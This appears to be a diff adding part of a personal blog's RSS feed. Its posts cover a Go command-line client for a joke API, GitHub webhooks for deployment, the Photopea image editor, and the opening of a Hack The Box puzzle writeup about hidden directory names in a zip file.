+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;BaseURL&lt;/span&gt;              &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;        = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://api.chucknorris.io/jokes/random&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;DefaultClientTimeout&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;time&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Duration&lt;/span&gt; = &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;time&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Second&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;type&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;CNClient&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;client&lt;/span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;http&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Client&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;baseURL&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;NewCNClient&lt;/span&gt;() &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;CNClient&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;CNClient&lt;/span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;client&lt;/span&gt;: &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;http&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Client&lt;/span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#a6e22e&#34;&gt;Timeout&lt;/span&gt;: &lt;span style=&#34;color:#a6e22e&#34;&gt;DefaultClientTimeout&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		},
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;baseURL&lt;/span&gt;: &lt;span style=&#34;color:#a6e22e&#34;&gt;BaseURL&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;CNClient&lt;/span&gt;) &lt;span style=&#34;color:#a6e22e&#34;&gt;SetTimeout&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;d&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;time&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Duration&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;client&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Timeout&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;d&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The Fetch method utilises the client to create a new get request, we use &lt;code&gt;json/encoding&lt;/code&gt; package to decode the &lt;code&gt;json&lt;/code&gt; response and store in our struct created from &lt;code&gt;model/Fact.go&lt;/code&gt; and return the datatype.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// client.go
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;CNClient&lt;/span&gt;) &lt;span style=&#34;color:#a6e22e&#34;&gt;Fetch&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;category&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;) (&lt;span style=&#34;color:#a6e22e&#34;&gt;model&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Fact&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;error&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;BaseURL&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;category&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;BaseURL&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;?category=&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;category&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;resp&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;client&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Get&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;model&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Fact&lt;/span&gt;{}, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;defer&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;resp&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Body&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Close&lt;/span&gt;()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;factResp&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;model&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Fact&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;json&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;NewDecoder&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;resp&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Body&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;Decode&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;factResp&lt;/span&gt;); &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;model&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Fact&lt;/span&gt;{}, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;factResp&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;gocfgo&#34;&gt;gocf.go&lt;/h2&gt;
+&lt;p&gt;In our &lt;code&gt;gocf.go&lt;/code&gt; file we utilise the &lt;code&gt;flag&lt;/code&gt; package to capture the  flags and then we compare the option givens with our categories map which we create before. We use the &lt;code&gt;strings&lt;/code&gt; package to join our string array into a long string and print it out to the &lt;code&gt;stdout&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;() {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;categories&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;model&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Categories&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;cat&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;categories&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;MapValues&lt;/span&gt;()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;factAmt&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Int&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;n&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Number of facts to fetch&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;category&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;String&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;c&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;categories: &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;categories&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;PrintCategories&lt;/span&gt;())
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Parse&lt;/span&gt;()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;_&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;ok&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;cat&lt;/span&gt;[&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;category&lt;/span&gt;]; !&lt;span style=&#34;color:#a6e22e&#34;&gt;ok&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;category&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;cnClient&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;client&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;NewCNClient&lt;/span&gt;()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;cnClient&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;SetTimeout&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;time&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Duration&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;time&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Second&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;facts&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; []&lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;{}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &amp;lt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;factAmt&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;fact&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;cnClient&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Fetch&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;category&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Println&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;facts&lt;/span&gt; = append(&lt;span style=&#34;color:#a6e22e&#34;&gt;facts&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fact&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Value&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%s\n&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;strings&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Join&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;facts&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\n&amp;#34;&lt;/span&gt;))
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
+&lt;p&gt;That&amp;rsquo;t it.&lt;/p&gt;
+&lt;/blockquote&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>Github Webhooks</title>
+      <link>/posts/githubwebhooks/</link>
+      <pubDate>Fri, 06 Jan 2023 00:00:00 +0000</pubDate>
+      
+      <guid>/posts/githubwebhooks/</guid>
+      <description>Github webhooks is a feature that allows you to send HTTP POST payload to certain events that occurs in your repository hosted on github. Events like pushing to a branch or merge are good examples for using webhooks.
+Read more about webhooks
+Webhooks can be used for triggering builds or deployments and allows us to integrate devOps principles even if you don&amp;rsquo;t use any Platform as a Service(PaaS).
+Here is a really good blog post of setting up webhook for continuous deployment in your VPS.</description>
+      <content>&lt;p&gt;Github webhooks is a feature that allows you to send HTTP POST payload to certain events that occurs in your repository hosted on &lt;a href=&#34;https://github.com&#34;&gt;github.&lt;/a&gt; Events like pushing to a branch or merge are good examples for using webhooks.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://https://docs.github.com/en/developers/webhooks-and-events/webhooks/about-webhooks&#34;&gt;Read more about webhooks&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Webhooks can be used for triggering builds or deployments and allows us to integrate devOps principles even if you don&amp;rsquo;t use any Platform as a Service(PaaS).&lt;/p&gt;
+&lt;p&gt;Here is a really good blog post of setting up webhook for continuous deployment in your VPS.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://maximorlov.com/automated-deployments-from-github-with-webhook/&#34;&gt;Setting up Github Webhook&lt;/a&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;I use webhooks to trigger a hugo build on my server and move the contents of the static site generated to my nginx root folder.&lt;/p&gt;
+&lt;/blockquote&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>Photopea - A photoshop alternative</title>
+      <link>/posts/photopea/</link>
+      <pubDate>Sat, 31 Dec 2022 18:00:04 +1100</pubDate>
+      
+      <guid>/posts/photopea/</guid>
+      <description>Photopea is a free online image editor that allows users to edit and create graphics and designs using a range of tools and features. It is a powerful and versatile alternative to software such as Adobe Photoshop, and can be used by individuals and businesses alike.
+One of the key features of Photopea is its ability to edit a wide range of file types, including PSD, XCF, and SVG. This means that users can edit and create graphics using the same tools and features that they would with a more expensive, proprietary software.</description>
+      <content>&lt;p&gt;&lt;a href=&#34;https://photopea.com&#34;&gt;Photopea&lt;/a&gt; is a free online image editor that allows users to edit and create graphics and designs using a range of tools and features. It is a powerful and versatile alternative to software such as Adobe Photoshop, and can be used by individuals and businesses alike.&lt;/p&gt;
+&lt;p&gt;One of the key features of Photopea is its ability to edit a wide range of file types, including PSD, XCF, and SVG. This means that users can edit and create graphics using the same tools and features that they would with a more expensive, proprietary software.&lt;/p&gt;
+&lt;p&gt;In addition to basic editing tools such as cropping, resizing, and rotating, Photopea offers a range of advanced features including layers, masks, and filters. Users can also add text and shapes, adjust the color and tone of their images, and apply effects such as blur and distortion.&lt;/p&gt;
+&lt;p&gt;Another useful feature of Photopea is its integration with Google Drive, which allows users to save their work directly to the cloud and access it from anywhere. This is particularly useful for those who work on multiple devices or need to collaborate with others on projects.&lt;/p&gt;
+&lt;p&gt;Unless you are editing images which consists of lots of layer, complex effects and layer style, photopea will most likely meet your requirements. Open your browser, enter &lt;a href=&#34;https://photopea.com&#34;&gt;photopea.com&lt;/a&gt; in the url bar and you are good to go on your editing&lt;/p&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>[HTB] misDIRection writeup</title>
+      <link>/posts/misdirection/</link>
+      <pubDate>Sat, 31 Dec 2022 00:00:00 +0000</pubDate>
+      
+      <guid>/posts/misdirection/</guid>
+      <description>This is my writeup for misDIRection, which is a miscellaneous challenge in hackthebox. The challenge seems fairly simple and involves a zip file that contains directories and files in a specific order. Upon inspection, the files are empty and probably why the title of the challenge is misdirection.
+Steps for finding the flag Unzipping the file yields a directory with the name .secret, which is hidden in unix based systems.</description>
+      <content>&lt;p&gt;This is my writeup for misDIRection, which is a miscellaneous challenge in hackthebox. The challenge seems fairly simple and involves a zip file that contains directories and files in a specific order. Upon inspection, the files are empty and probably why the title of the challenge is misdirection.&lt;/p&gt;
